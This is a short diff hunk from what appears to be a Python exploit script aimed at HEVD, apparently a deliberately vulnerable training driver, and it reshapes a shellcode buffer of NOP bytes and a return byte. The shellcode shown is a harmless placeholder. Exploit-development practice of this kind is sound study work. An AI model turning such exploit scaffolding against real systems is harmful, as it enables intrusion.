@@ -308,7 +308,10 @@ def send_buf(hevd):
 
     shellcode = bytearray(
     "\x90" * 100
-    "\xc3"
+    )
+
+    shellcode = shellcode + bytearray(
+        "\xc3"
     )
 
     print("[*] Allocating shellcode character array...")
